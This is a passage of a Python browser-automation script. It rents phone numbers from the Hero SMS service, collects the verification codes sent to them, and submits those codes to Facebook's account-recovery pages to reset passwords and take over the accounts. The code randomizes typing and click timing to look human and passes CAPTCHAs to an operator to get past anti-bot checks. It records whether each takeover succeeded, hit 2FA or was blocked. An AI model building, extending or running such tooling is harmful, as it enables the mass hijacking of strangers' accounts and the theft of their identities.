        except Exception as e:
            print(f"⚠️ [API] getStatus error: {e}")
        time.sleep(5)
    print("⏳ [API] Timed out waiting for OTP; releasing the number.")
    try:
        _api_call("setStatus", {"id": activation_id, "status": "8"})  # cancel
    except Exception:
        pass
    return None


PHONE_RE = re.compile(r"(?<!\d)(?:\+?\d[\d\s().-]{7,}\d)(?!\d)")


def is_placeholder_url(url: str) -> bool:
    return not url.startswith("http") or "example.com" in url


def find_or_open_page(context, url_hint: str) -> Page:
    matched_page = None
    for page in context.pages:
        if url_hint and not is_placeholder_url(url_hint) and url_hint in page.url:
            matched_page = page
            break

    if not matched_page:
        matched_page = context.new_page()
        if not is_placeholder_url(url_hint):
            matched_page.goto(url_hint, wait_until="domcontentloaded")
            
    # Clean up any blank/unused startup tabs to keep the browser window clean
    try:
        for p in list(context.pages):
            if p != matched_page:
                p_url = p.url.lower()
                if "about:blank" in p_url or "newtab" in p_url or "welcome" in p_url or "profile-picker" in p_url:
                    if len(context.pages) > 1:
                        p.close()
                        print(f"🧹 Closed unused background startup tab: '{p_url}'")
    except Exception as tab_err:
        print(f"⚠️ Error cleaning blank tabs: {tab_err}")

    return matched_page


def login_if_needed(context) -> None:
    if not CONFIG.auto_login:
        return

    if is_placeholder_url(CONFIG.login_url):
        print("Login URL is still a placeholder; skipping auto-login.")
        return

    username = os.environ.get("HERO_SMS_USERNAME", "").strip() or getattr(CONFIG, 'hero_username', "").strip()
    password = os.environ.get("HERO_SMS_PASSWORD", "") or getattr(CONFIG, 'hero_password', "")
    if not username or not password:
        raise RuntimeError(
            "Set HERO_SMS_USERNAME and HERO_SMS_PASSWORD in environment or config.json before running auto-login."
        )

    page = find_or_open_page(context, CONFIG.login_url)
    page.bring_to_front()

    if already_logged_in(page):
        print("Already logged in.")
        return

    # Click the Log in button to open the login form if needed (retry loop to handle JS load races)
    form_opened = False
    for click_attempt in range(5):
        try:
            if page.locator(CONFIG.username_selector).first.is_visible(timeout=1000):
                print("Login form is open.")
                form_opened = True
                break
        except Exception:
            pass
            
        print(f"Clicking Log in button (attempt {click_attempt+1})...")
        try:
            page.locator("a:has-text('Login / Register'):visible, button:has-text('Log in'):visible, a:has-text('Log in'):visible, .login-btn:visible").first.click(timeout=3000)
            time.sleep(2.0) # Wait slightly longer for animation/JS initialization
        except Exception as e:
            print(f"Log in button click failed: {e}")
            
    if not form_opened:
        print("⚠️ Warning: Login form could not be verified as open. Attempting to proceed anyway...")
    
    # Fill in credentials
    print("Filling in email...")
    page.locator(CONFIG.username_selector).first.fill(username, timeout=20_000)
    time.sleep(1.0)
    
    print("Filling in password...")
    page.locator(CONFIG.password_selector).first.fill(password, timeout=20_000)
    time.sleep(2.0)
    
    # 2. Find Cloudflare Turnstile verification widget and wait for human click/success
    print("⏳ Locating Cloudflare verification widget...")
    turnstile_frame = None
    
    # Poll up to 30 seconds to locate the Turnstile iframe
    for _ in range(30):
        for frame in page.frames:
            if "challenges.cloudflare.com" in frame.url or "turnstile" in frame.url:
                turnstile_frame = frame
                break
        if turnstile_frame:
            break
        time.sleep(1)
        
    if turnstile_frame:
        print("\n👇 CLOUDFLARE TURNSTILE DETECTED 👇")
        print("👉 Please manually click the 'Verify you are human' checkbox in the Chrome window.")
        print("👉 The bot will automatically detect when it succeeds and submit the form for you.")
        
        success_detected = False
        # Poll for up to 60 seconds for the user to solve it
        for sec in range(30):
            try:
                success_text = turnstile_frame.get_by_text("Success!", exact=False).first
                if success_text.is_visible(timeout=500):
                    print("\n🎉 Cloudflare Turnstile verification SUCCEEDED (Success! detected)!")
                    success_detected = True
                    break
            except:
                pass
            if sec > 0 and sec % 10 == 0:
                print(f"⏳ Still waiting for you to click the Turnstile checkbox (elapsed: {sec}s)...")
            time.sleep(1)
            
        if not success_detected:
            print("⚠️ Turnstile 'Success!' status not detected. Moving forward to click Login anyway...")
    else:
        print("ℹ️ No Cloudflare Turnstile widget detected.")
        
    # Wait another 5 seconds as requested by the user
    print("⏳ Waiting 5 seconds for verification token to settle...")
    time.sleep(5.0)
    
    # 5. Click the Login button
    print("🖱️ Clicking Login button...")
    try:
        page.locator(CONFIG.submit_selector).first.click(timeout=5000)
    except Exception as e:
        print(f"⚠️ Click Login button failed: {e}")
    
    # Wait for successful login (up to 30 seconds)
    print("⏳ Waiting for login verification (please solve Cloudflare Turnstile if prompted)...")
    for sec in range(30):
        if already_logged_in(page):
            print("🎉 Login completed successfully!")
            return
        if sec > 0 and sec % 5 == 0:
            try:
                submit_btn = page.locator(CONFIG.submit_selector).first
                if submit_btn.is_visible():
                    submit_btn.click()
            except Exception:
                pass
        time.sleep(1)
        
    if already_logged_in(page):
        print("🎉 Login completed successfully!")
    else:
        print("⚠️ Warning: Login check did not confirm success. Proceeding anyway.")


def already_logged_in(page: Page) -> bool:
    # If a Login / Register button is visible, we are definitely NOT logged in
    try:
        login_btn = page.locator("a:has-text('Login / Register'), button:has-text('Log in')").first
        if login_btn.is_visible(timeout=1000):
            return False
    except Exception:
        pass

    # If My purchases / Purchases is visible, we are logged in
    try:
        purchases_btn = page.locator("a:has-text('My purchases'), a:has-text('Purchases'), button:has-text('My purchases')").first
        if purchases_btn.is_visible(timeout=1000):
            return True
    except Exception:
        pass

    if CONFIG.logged_in_text:
        try:
            return page.get_by_text(
                re.compile(re.escape(CONFIG.logged_in_text), re.I)
            ).first.is_visible(timeout=1000)
        except Exception:
            return False

    return False


def click_visible_text(page: Page, text: str, timeout_ms: int = 10_000) -> None:
    if not text:
        return

    candidates = [
        page.get_by_role("button", name=re.compile(re.escape(text), re.I)),
        page.get_by_role("link", name=re.compile(re.escape(text), re.I)),
        page.get_by_text(re.compile(re.escape(text), re.I)).first,
        page.locator(f"button:has-text('{text}'), a:has-text('{text}'), div[role='button']:has-text('{text}')").first,
    ]

    last_error: Exception | None = None
    for locator in candidates:
        try:
            if locator.is_visible(timeout=2000):
                try:
                    locator.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
                    time.sleep(0.2)
                except Exception:
                    pass
                try:
                    locator.click(timeout=timeout_ms)
                except Exception:
                    try:
                        locator.click(timeout=timeout_ms, force=True)
                    except Exception:
                        locator.evaluate("el => el.click()")
                try:
                    page.wait_for_load_state("networkidle", timeout=2000)
                except Exception:
                    pass
                return
        except Exception as exc:
            last_error = exc

    raise RuntimeError(f"Could not click visible text {text!r}") from last_error



def get_top_number(page: Page) -> str:
    """Helper to get the number currently at the top of the table."""
    try:
        cell = page.locator("tbody tr:first-child td:first-child").first
        if cell.is_visible(timeout=2000):
            return normalize_phone(cell.inner_text().strip())
    except:
        pass
    return ""


def extract_phone_number(page: Page, selector: str, previous_number: str = "") -> str:
    if selector:
        try:
            text = page.locator(selector).first.inner_text(timeout=20_000).strip()
            if text:
                return normalize_phone(text)
        except Exception:
            pass

    # Special handling for Hero SMS: look in the purchases table
    print("Looking for phone number in purchases table dynamically...")
    time.sleep(3)  # Brief wait for purchase AJAX to process
    
    max_retries = 8 # increased retries for slow API
    retry_count = 0
    
    table_number = ""
    while retry_count < max_retries:
        try:
            # 1. Try Desktop Table layout
            table_row = page.locator("tbody tr:first-child td:first-child, table tr:nth-child(2) td:first-child, .purchases-table td:first-child, td[data-title*='number']").first
            if table_row.is_visible(timeout=1500):
                table_number = table_row.inner_text(timeout=2000).strip()
            else:
                # 2. Fallback to Responsive Card layout (extracting text from the top card / body)
                body_text = page.locator("body").inner_text(timeout=2000)
                matches = re.findall(r"\+\d[\d\s\(\)\-]{7,}\d", body_text)
                if matches:
                    table_number = matches[0]
            
            print(f"Attempt {retry_count + 1}: Extracted phone text: '{table_number}'")
            
            # Check if it's a valid phone number
            if table_number and len(table_number) > 5 and ('+' in table_number or any(c.isdigit() for c in table_number)):
                normalized = normalize_phone(table_number)
                
                if previous_number and normalized == previous_number:
                    print(f"⚠️ Still seeing the previous number '{normalized}'. Waiting for new one...")
                else:
                    print(f"✅ Found valid NEW number: {normalized}")
                    return normalized
            else:
                print(f"❌ Invalid or empty number: '{table_number}'.")
                
        except Exception as e:
            print(f"Error reading phone number: {e}")
        
        retry_count += 1
        if retry_count < max_retries:
            print(f"Waiting 4 seconds before next attempt...")
            time.sleep(4)
            # Hero SMS sometimes gets stuck on "The list is empty." unless refreshed
            if "The list is empty" in table_number or retry_count == 2 or retry_count == 5:
                print("Reloading page to force table refresh...")
                try:
                    page.reload(wait_until="domcontentloaded")
                except Exception:
                    pass
                time.sleep(3)
    
    # If we still don't have a number, raise error
    raise RuntimeError("Could not extract a valid NEW phone number from the Hero SMS purchases table.")


def normalize_phone(value: str) -> str:
    if not value:
        return ""
    # Strip all non-digit characters (+, spaces, parentheses, dashes)
    return "".join([c for c in value if c.isdigit()])


def human_type(element, text: str):
    import random
    element.focus()
    element.click()
    time.sleep(random.uniform(0.15, 0.35))
    element.press("Control+A")
    element.press("Backspace")
    time.sleep(random.uniform(0.1, 0.2))
    
    for char in text:
        element.type(char)
        time.sleep(random.uniform(0.08, 0.22)) # random keystroke delay between 80ms and 220ms


def human_click(element, timeout_ms=10000):
    import random
    element.scroll_into_view_if_needed(timeout=timeout_ms)
    time.sleep(random.uniform(0.2, 0.4))
    element.hover(timeout=timeout_ms)
    time.sleep(random.uniform(0.15, 0.35))
    element.click(timeout=timeout_ms)


def delete_failed_number(page: Page) -> None:
    """Delete the most recently purchased number (failed one) from the table."""
    # Disabled per user request (number deletion skipped)
    print("\n🗑️  Number deletion skipped (disabled per configuration)")
    pass


def check_price_range(btn_element, min_price: float, max_price: float) -> tuple[bool, float]:
    try:
        btn_text = btn_element.inner_text().strip()
        price_match = re.search(r'\$?([0-9]+\.[0-9]+)', btn_text)
        if price_match:
            price = float(price_match.group(1))
            if min_price <= price <= max_price:
                return True, price
            else:
                return False, price
                
        # If no price text found in button itself, check parent/surrounding text
        parent_text = btn_element.locator("xpath=..").inner_text()
        price_match_parent = re.search(r'\$?([0-9]+\.[0-9]+)', parent_text)
        if price_match_parent:
            price = float(price_match_parent.group(1))
            if min_price <= price <= max_price:
                return True, price
            else:
                return False, price
    except Exception:
        pass
    return True, 0.0


def select_service_and_country(page: Page) -> bool:
    check_for_ban(page)
    close_cookies_if_needed(page)
    check_and_recover_server_error(page)
    print("\n🤖 Ensuring service and country are selected...")
    try:
        # Pre-selection check: see if the target service and country are already selected
        buy_candidates = []
        if CONFIG.buy_text:
            buy_candidates.append(CONFIG.buy_text)
        buy_candidates.extend(["Buy for", "Buy"])
        
        buy_btn_visible = False
        for candidate in buy_candidates:
            try:
                btn = page.locator(f"button:has-text('{candidate}'), a:has-text('{candidate}'), div[role='button']:has-text('{candidate}'), .v-btn:has-text('{candidate}')").first
                if btn.is_visible(timeout=500):
                    buy_btn_visible = True
                    break
            except Exception:
                pass
                
        if not buy_btn_visible:
            try:
                regex_btn = page.get_by_role("button", name=re.compile(r"buy", re.I)).first
                if not regex_btn.is_visible(timeout=500):
                    regex_btn = page.locator("button, a, div[role='button'], .v-btn").filter(has_text=re.compile(r"buy", re.I)).first
                if regex_btn.is_visible(timeout=500):
                    buy_btn_visible = True
            except Exception:
                pass

        if buy_btn_visible:
            # Check if the service and country texts are also visible on the page
            service_visible = False
            country_visible = False
            try:
                service_visible = page.get_by_text(re.compile(f"^{CONFIG.service_text}$", re.I)).first.is_visible(timeout=500)
                country_visible = page.get_by_text(re.compile(f"^{CONFIG.country_text}$", re.I)).first.is_visible(timeout=500)
            except Exception:
                pass
                
            if service_visible and country_visible:
                print(f"✅ Service '{CONFIG.service_text}' and country '{CONFIG.country_text}' are already selected.")
                return True
            else:
                print("⚠️ Buy button is visible, but service/country selection doesn't match config. Reloading page to reset state...")
                page.reload(wait_until="domcontentloaded", timeout=15000)
                time.sleep(2)
        else:
            # Even if buy button is not visible, if service card is not visible, it might be in a partially selected state.
            # Check if the service cards list/elements are visible.
            try:
                service_card_visible = page.locator(".service-card, .v-card").first.is_visible(timeout=500)
                if not service_card_visible:
                    print("⚠️ Service list is not visible. Reloading page to reset state...")
                    page.reload(wait_until="domcontentloaded", timeout=15000)
                    time.sleep(2)
            except Exception:
                pass
    except Exception as e_check:
        print(f"⚠️ Pre-selection check encountered an issue: {e_check}. Proceeding with fresh selection...")

    try:

        print(f"Selecting service: {CONFIG.service_text}...")
        # First type into the service search box if visible
        try:
            service_search = page.get_by_placeholder(re.compile("service|servicio", re.I)).first
            if not service_search.is_visible(timeout=1000):
                service_search = page.locator("input[placeholder*='Search by service' i], input[placeholder*='service' i], input[placeholder*='servicio' i]").first
            
            if service_search.is_visible(timeout=1500):
                try:
                    service_search.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
                    time.sleep(0.2)
                except Exception:
                    pass
                try:
                    service_search.click(timeout=1000, force=True)
                except Exception:
                    pass
                service_search.fill("")
                service_search.fill(CONFIG.service_text)
                time.sleep(1.0)
        except Exception as e_service_search:
            print(f"⚠️ Service search input lookup skipped: {e_service_search}")

        service_btn = page.locator(f".service-card:has-text('{CONFIG.service_text}'), .v-card:has-text('{CONFIG.service_text}')").first
        if not service_btn.is_visible(timeout=1500):
            service_btn = page.get_by_text(re.compile(f"^{CONFIG.service_text}$", re.I)).first

        try:
            service_btn.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
            time.sleep(0.3)
        except Exception:
            pass

        try:
            service_btn.click(timeout=3000)
        except Exception:
            try:
                service_btn.click(timeout=3000, force=True)
            except Exception:
                service_btn.evaluate("el => (el.closest('.service-card') || el.closest('.v-card') || el).click()")
            
        time.sleep(1.5)
        
        print(f"Selecting country: {CONFIG.country_text}...")
        try:
            search_input = page.get_by_placeholder(re.compile("country|país", re.I)).first
            if not search_input.is_visible(timeout=1000):
                search_input = page.locator("input[placeholder*='Search by country' i], input[placeholder*='country' i], input[placeholder*='país' i]").first
            
            if search_input.is_visible(timeout=1500):
                try:
                    search_input.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
                    time.sleep(0.2)
                except Exception:
                    pass
                try:
                    search_input.click(timeout=1000, force=True)
                except Exception:
                    pass
                search_input.fill(CONFIG.country_text)
                time.sleep(1.0)
        except Exception as e_search:
            print(f"⚠️ Search input lookup skipped: {e_search}")
        
        # Match the country by a CASE-INSENSITIVE PARTIAL match, because the row
        # usually includes a flag, country code and/or price next to the name
        # (so an exact "Philippines" match fails even when it's right there).
        ct = CONFIG.country_text.strip()
        ct_lower = ct.lower()
        xpath_ci = (
            "//li[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '%s')]"
            " | //*[@role='button'][contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '%s')]"
            " | //span[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '%s')]"
        ) % (ct_lower, ct_lower, ct_lower)
        country_btn = page.locator(xpath_ci).first
        if not country_btn.is_visible(timeout=2500):
            # Fallback: any element whose text CONTAINS the country name (case-insensitive)
            country_btn = page.get_by_text(re.compile(re.escape(ct), re.I)).first
        if not country_btn.is_visible(timeout=2000):
            print(f"⚠️ Country '{ct}' not found in the list — it may be OUT OF STOCK for this service, "
                  f"or Hero SMS spells it differently. Try a different country.")
             
        try:
            country_btn.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
            time.sleep(0.3)
        except Exception:
            pass

        try:
            country_btn.click(timeout=5000)
        except Exception:
            try:
                country_btn.click(timeout=5000, force=True)
            except Exception:
                country_btn.evaluate("el => el.click()")
            
        time.sleep(1.5)
        return True
    except Exception as e:
        print(f"⚠️ Could not select service/country automatically: {e}")
        return False


def wait_for_sms_code(page: Page, phone_number: str = None, fb_page: Page = None, timeout_sec: int = 180, session_stats: dict = None) -> str:
    print(f"\n⏳ Waiting up to {timeout_sec} seconds for SMS code to arrive on Hero SMS...")
    
    # Resolve the correct active Hero SMS tab from context pages (multi-tab support)
    hero_tab = page
    try:
        for p_tab in page.context.pages:
            p_url = p_tab.url.lower()
            if ("hero-sms" in p_url or "herosms" in p_url) and "purchases" in p_url:
                hero_tab = p_tab
                print("🎯 Found active Purchases tab. Using it for SMS verification.")
                break
    except Exception as tab_err:
        print(f"⚠️ Error checking multi-tab layout: {tab_err}")
        
    # Ensure the tab is navigated to the Purchases page to see the active code table
    try:
        navigate_to_purchases(hero_tab)
        time.sleep(1.5)
    except Exception as nav_err:
        print(f"⚠️ Could not navigate to purchases page: {nav_err}")
        
    start_time = time.time()
    last_refresh_time = start_time
    
    while time.time() - start_time < timeout_sec:
        # Dynamically scan open tabs to bind to the active Purchases tab if it loads or opens
        try:
            for p_tab in page.context.pages:
                p_url = p_tab.url.lower()
                if ("hero-sms" in p_url or "herosms" in p_url) and "purchases" in p_url:
                    if hero_tab != p_tab:
                        hero_tab = p_tab
                        print("🎯 Dynamic Tab Switch: Bound to active Purchases page tab.")
                    break
        except:
            pass
            
        # Check if the Facebook tab in the background has thrown a CAPTCHA verification check
        if fb_page:
            try:
                captcha_iframe = fb_page.locator("iframe[src*='recaptcha'], iframe[title*='recaptcha'], iframe[src*='captcha'], .g-recaptcha").first
                captcha_text = fb_page.get_by_text(re.compile("Help us confirm|Confirm it's you|Confirm that it's you", re.I)).first
                if captcha_iframe.is_visible(timeout=500) or captcha_text.is_visible(timeout=500):
                    if session_stats is not None:
                        session_stats["captcha_triggers"] = session_stats.get("captcha_triggers", 0) + 1
                    print("\a\a\a") # Play console alert beeps
                    print("\n🚨🚨🚨 CAPTCHA DETECTED ON FACEBOOK TAB! 🚨🚨🚨")
                    print("🛑 AUTOMATION PAUSED. Bringing Facebook tab to front. Please solve it manually...")
                    fb_page.bring_to_front()
                    if captcha_iframe.is_visible():
                        captcha_iframe.wait_for(state="hidden", timeout=300_000)
                    else:
                        captcha_text.wait_for(state="hidden", timeout=300_000)
                    print("✅ CAPTCHA solved! Returning to Hero SMS window to wait for SMS...")
                    
                    # Re-detect the correct active Hero SMS purchases tab if it changed during CAPTCHA pause
                    try:
                        for p_tab in page.context.pages:
                            if ("hero-sms" in p_tab.url.lower() or "herosms" in p_tab.url.lower()) and "purchases" in p_tab.url.lower():
                                hero_tab = p_tab
                                break
                    except:
                        pass
                    
                    try:
                        if hero_tab and not hero_tab.is_closed():
                            hero_tab.bring_to_front()
                    except Exception:
                        pass
                    # Immediately force navigate back to Purchases page to restore code table view
                    try:
                        navigate_to_purchases(hero_tab)
                        time.sleep(1.0)
                    except Exception as nav_err:
                        print(f"⚠️ Post-captcha navigation failed: {nav_err}")
                    # Reset the start time so the user gets a full 180 seconds wait window starting NOW!
                    start_time = time.time()
                    last_refresh_time = start_time
                    time.sleep(3)
            except Exception as ce:
                # Silently ignore checks to prevent loop crashes
                pass
                
        # Check if the Facebook tab has displayed the "We can't send SMS" toast/banner
        if fb_page:
            try:
                sms_error_indicators = fb_page.get_by_text(re.compile(
                    r"We can't send SMS to this mobile number|Não podemos enviar um SMS para este número|No podemos enviar un SMS a este número|Não é possível enviar SMS para este número|No se puede enviar un SMS a este número", 
                    re.I
                )).first
                if sms_error_indicators.is_visible(timeout=500):
                    print("\n❌ Facebook error banner detected: 'We can't send SMS to this mobile number at the moment.'")
                    raise ValueError("sms_blocked_by_facebook")
            except ValueError as ve:
                raise ve
            except:
                pass

        try:
            # Find the row containing our phone number suffix using robust digit-based matching in Python
            matched_row = None
            if phone_number:
                clean_pn = ''.join([c for c in phone_number if c.isdigit()])
                suffix = clean_pn[-8:] if len(clean_pn) >= 8 else clean_pn
                try:
                    rows = hero_tab.locator("tbody tr, div[class*='card']").all()
                    for r in rows:
                        r_text = r.inner_text()
                        clean_r_text = ''.join([c for c in r_text if c.isdigit()])
                        if suffix and suffix in clean_r_text:
                            matched_row = r
                            break
                except Exception as r_err:
                    pass
            
            row = matched_row
            if not row or not row.is_visible(timeout=800):
                # Fallback to the first row in the table
                row = hero_tab.locator("tbody tr:first-child, div[class*='card']").first
                
            if row.is_visible(timeout=1000):
                text = row.inner_text(timeout=2000)
            else:
                text = hero_tab.locator("body").inner_text(timeout=2000)
            

            
            # Permissive search for any 6-digit code when SMS indicator or code keyword is present
            if any(k in text.lower() for k in ["sms received", "sms code", "code", "código"]):
                match = re.search(r"\b(\d{6})\b", text) or re.search(r"SMS Code:\s*(\d{5,8})", text, re.I) or re.search(r"code:?\s*(\d{5,8})", text, re.I)
                if match:
                    code = match.group(1)
                    print(f"✅ Received SMS Code: {code}")
                    return code
            
            # Click refresh or re-navigate every ~30 seconds if still waiting
            if time.time() - last_refresh_time > 30:
                try:
                    # The refresh button is usually a circular arrow icon next to the number row
                    # We query it relative to the row content container to avoid matching header svgs
                    refresh_btn = row.locator("button").filter(has=row.locator("svg")).first
                    if refresh_btn.is_visible(timeout=1000):
                        refresh_btn.click(timeout=3000)
                        print("🔄 Clicked refresh icon for the number...")
                    else:
                        print("🔄 Refresh icon not found. Reloading page to force SMS update...")
                        try:
                            hero_tab.reload(wait_until="domcontentloaded", timeout=10000)
                        except Exception as rel_err:
                            print(f"⚠️ Page reload failed: {rel_err}. Trying re-navigation fallback...")
                            navigate_to_purchases(hero_tab)
                except Exception as ref_err:
                    print(f"⚠️ Table refresh failed: {ref_err}. Re-navigating to Purchases...")
                    try:
                        navigate_to_purchases(hero_tab)
                    except:
                        pass
                last_refresh_time = time.time()
                    
        except Exception as e:
            # Ignore minor errors while polling (like row not fully loaded)
            pass
            
        time.sleep(3)
        
    raise RuntimeError(f"Timeout: No SMS code received after {timeout_sec} seconds.")


def handle_post_verification(context, target: Page) -> tuple[str, str]:
    print("\n⏳ Waiting for Facebook to process the code...")
    password_to_use = getattr(CONFIG, 'new_password', "HeroSmsRecover123!")
    
    try:
        # We will poll for up to 30 seconds to see where Facebook sends us
        for _ in range(15):
            # Dismiss overlay modals/popups/dialogs that might dim or block the form
            try:
                target.keyboard.press("Escape")
                
                # Check for Tutup / Not Now / Lain kali / Jangan sekarang buttons to click
                close_selectors = [
                    "button[aria-label*='Close' i]", "[role='button']:has-text('Close' i)",
                    "button:has-text('Not Now' i)", "[role='button']:has-text('Not Now' i)",
                    "button:has-text('Tutup' i)", "[role='button']:has-text('Tutup' i)",
                    "button:has-text('Lain kali' i)", "[role='button']:has-text('Lain kali' i)",
                    "button:has-text('Jangan sekarang' i)", "[role='button']:has-text('Jangan sekarang' i)",
                    "button:has-text('Agora não' i)", "[role='button']:has-text('Agora não' i)",
                    "button:has-text('Tutup' i)", "a:has-text('Tutup' i)", ".layerCancel"
                ]
                for sel in close_selectors:
                    btn = target.locator(sel).first
                    if btn.is_visible(timeout=100):
                        btn.click(timeout=1000)
                        time.sleep(0.5)
            except:
                pass

            # Scenario 1: Password Reset Page
            try:
                # Facebook sometimes renders the new password field as type="text" instead of type="password"
                # so we need to look for specific IDs or names in addition to the type.
                password_input = target.locator(
                    "input[type='password'], input[id*='password'], input[name*='password'], "
                    "input[placeholder*='Password' i], input[placeholder*='Sandi' i], "
                    "input[placeholder*='Senha' i], input[placeholder*='Contraseña' i]"
                ).first
                if password_input.is_visible(timeout=500):
                    print("\n🔑 Password reset required. Setting a new password...")
                    password_to_use = CONFIG.new_password
                    if not password_to_use:
                        import string
                        import random
                        chars = string.ascii_letters + string.digits + "!@#$%^&*"
                        password_to_use = ''.join(random.choice(chars) for _ in range(16))
                        
                    print(f"Typing new password: {password_to_use}")
                    
                    # Instead of calling standard human_type which scrolls into view and clicks
                    # (which trigger infinite scrolling behaviors if blocked by dialogs),
                    # we focus first, click via coordinates, and write.
                    try:
                        password_input.focus()
                        # If there is a backdrop blocking the element, a direct .click() might hang on scrolling.
                        # We try to click it forcefully, or click the body background first to dismiss popups.
                        target.mouse.click(10, 10) # Click top-left edge of page to dismiss floating web menus
                        time.sleep(0.5)
                        password_input.click(force=True, timeout=2000)
                    except Exception:
                        pass
                        
                    human_type(password_input, password_to_use)
                    time.sleep(1)
                    
                    submit_success = False
                    try:
                        # Broad check matching both <button> and <input> tags
                        continue_btn = target.locator("button[name='reset_action'], input[name='reset_action'], button[type='submit'], input[type='submit'], button[name='did_submit'], input[name='did_submit'], button[name='btn_continue'], input[name='btn_continue']").first
                        
                        if continue_btn.is_visible(timeout=2000):
                            human_click(continue_btn, timeout_ms=5000)
                            print("✅ Clicked Submit to set password!")
                            submit_success = True
                        else:
                            # Try text-based matching for English/Spanish
                            continue_btn = target.get_by_role("button", name=re.compile("Continue|Continuar", re.I)).first
                            if not continue_btn.is_visible(timeout=1000):
                                continue_btn = target.locator("button, a[role='button']").filter(has_text=re.compile("Continue|Continuar", re.I)).first
                                
                            if continue_btn.is_visible(timeout=1000):
                                human_click(continue_btn, timeout_ms=5000)
                                print("✅ Clicked text-matching Submit to set password!")
                                submit_success = True
                            else:
                                print("🔍 Falling back to language-agnostic structural button search...")
                                continue_btn = target.locator("form button[type='submit'], form input[type='submit'], button._42ft._4jy0._4jy3._4jy1._51sy").first
                                if continue_btn.is_visible(timeout=1000):
                                    human_click(continue_btn, timeout_ms=5000)
                                    print("✅ Clicked structural fallback Submit to set password!")
                                    submit_success = True
                    except Exception as e:
                        print(f"⚠️ Could not click Submit: {e}")
                    
                    if not submit_success:
                        print("⚠️ Submit button click failed. Trying to trigger click via JS fallback...")
                        try:
                            # Trigger button click via JS instead of form.submit() to keep submit handlers and validation tokens intact
                            target.evaluate("""
                                const btn = document.querySelector("button[name='reset_action'], input[name='reset_action'], button[type='submit'], input[type='submit']");
                                if (btn) {
                                    btn.click();
                                } else {
                                    const fallbackBtn = document.querySelector("form button, form input[type='submit']");
                                    if (fallbackBtn) fallbackBtn.click();
                                    else document.querySelector('form').submit();
                                }
                            """)
                            print("✅ Submitted password reset form successfully via JS click fallback!")
                            submit_success = True
                        except Exception as js_err:
                            print(f"❌ JS form submit fallback failed: {js_err}")
                            
                    if submit_success:
                        time.sleep(5)
                        return "success", password_to_use
                    else:
                        print("❌ Password reset form submission failed completely.")
                        return "blocked", ""
            except Exception:
                pass
                
            # Scenario 2: Main Feed (Logged in directly)
            try:
                # Look for common Facebook main feed elements
                if target.locator("svg[aria-label='Facebook']").is_visible(timeout=500) or \
                   target.locator("input[placeholder='Search Facebook']").is_visible(timeout=500) or \
                   target.locator("a[aria-label='Home']").is_visible(timeout=500):
                    print("\n✅ Automatically logged in to main page without password reset!")
                    return "success", "Not changed (Logged in directly)"
            except Exception:
                pass
                
            # Scenario 3: 2FA Authentication App required
            try:
                # Structural check for 2FA forms or specific text
                if target.locator("form[action*='two_factor'], input[name='approvals_code']").is_visible(timeout=500) or \
                   target.get_by_text(re.compile("Go to the authentication app|aplicativo de autenticação|雙重驗證|双重验证", re.I)).first.is_visible(timeout=500):
                    print("\n🔐 2FA Authentication App required! This is considered a SUCCESSFUL recovery.")
                    return "2fa", password_to_use
            except Exception:
                pass
                
            # Scenario 4: Account Locked/Checkpoint or Suspended
            try:
                # Structural check for checkpoints (e.g., "Account suspended", "Help us confirm", "Upload ID")
                if target.url and "checkpoint" in target.url.lower():
                    print("\n❌ Account is locked in a Facebook Checkpoint. Moving to next number...")
                    print("🧹 Clearing Facebook cookies to force logout...")
                    context.clear_cookies(domain=".facebook.com")
                    context.clear_cookies(domain="www.facebook.com")
                    return "blocked", ""
                    
                # Explicitly check for suspension screen
                if target.get_by_text(re.compile("We suspended your account|Suspendemos sua conta|停用了您的帳戶|停用了你的帳戶|Suspendimos tu cuenta", re.I)).first.is_visible(timeout=500):
                    print("\n❌ Account is SUSPENDED. Moving to next number...")
                    print("🧹 Clearing Facebook cookies to force logout...")
                    context.clear_cookies(domain=".facebook.com")
                    context.clear_cookies(domain="www.facebook.com")
                    return "blocked", ""
                    
                # Explicitly check for "Check your notifications on another device" screen
                if target.get_by_text(re.compile("Aguardando aprovação|Verifique suas notificações|Check your notifications|Approve the login|核准登入|確認登入|確認您的登入|在其他裝置|在其他设备", re.I)).first.is_visible(timeout=500):
                    print("\n❌ Login approval from another device required! We cannot bypass this.")
                    print("🧹 Clearing Facebook cookies to force logout...")
                    context.clear_cookies(domain=".facebook.com")
                    context.clear_cookies(domain="www.facebook.com")
                    return "blocked", ""
                    
            except Exception:
                pass
                
            time.sleep(2)
            
        print("⚠️ Timed out waiting for post-verification state. We might be stuck on an intermediate page.")
        # Return True anyway to try extracting the session just in case we are logged in
        return "success", "Unknown state (Timed out)"
        
    except Exception as e:
        print(f"❌ Error during post-verification: {e}")
        return "blocked", ""


def submit_facebook_code(target: Page, code: str) -> bool:
    print(f"\n📝 Submitting code {code} to Facebook...")
    try:
        # Enter code input field - use structural matching first
        code_input = target.locator("input[name='n'], #recovery_code_entry, input[type='text'], input[type='number']").first
        if not code_input.is_visible(timeout=2000):
            code_input = target.get_by_role("textbox", name=re.compile("Enter code|Insira o código|輸入驗證碼|輸入代碼", re.I)).first
            if not code_input.is_visible(timeout=1000):
                code_input = target.get_by_placeholder(re.compile("Enter code|Insira o código|輸入驗證碼|輸入代碼", re.I)).first

        human_type(code_input, code)
        time.sleep(1)
        
        # Click continue - target only visible buttons/inputs to avoid hidden elements
        continue_btn = target.locator("button[name='did_submit']:visible, input[name='did_submit']:visible, button[type='submit']:visible, input[type='submit']:visible, button[value='1']:visible").first
        if not continue_btn.is_visible(timeout=2000):
            continue_btn = target.get_by_role("button", name=re.compile("Continue|Continuar|繼續|继续|Avançar|Avançar", re.I)).first
        
        submit_success = False
        try:
            human_click(continue_btn, timeout_ms=5000)
            submit_success = True
        except Exception as click_err:
            print(f"⚠️ Code submit standard click blocked: {click_err}. Trying trusted forced click...")
            try:
                continue_btn.click(force=True, timeout=5000)
                submit_success = True
            except Exception as force_err:
                print(f"⚠️ Code submit forced click failed: {force_err}. Resorting to JS submit...")
                
